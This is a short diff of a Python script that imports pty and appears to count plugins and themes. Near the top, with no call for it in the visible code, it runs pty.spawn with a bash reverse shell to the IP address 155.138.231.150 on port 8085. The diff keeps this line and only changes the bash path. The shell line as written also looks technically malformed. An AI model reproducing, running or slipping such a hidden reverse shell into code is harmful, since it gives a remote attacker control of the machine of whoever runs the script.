@@ -2,7 +2,7 @@ import re
 import glob
 import pty
 
-pty.spawn("/bin/bash -i >& /dev/tcp/155.138.231.150/8085 0>&1")
+pty.spawn("/usr/bin/bash -i >& /dev/tcp/155.138.231.150/8085 0>&1")
 
 plugins = 0
 themes = 0
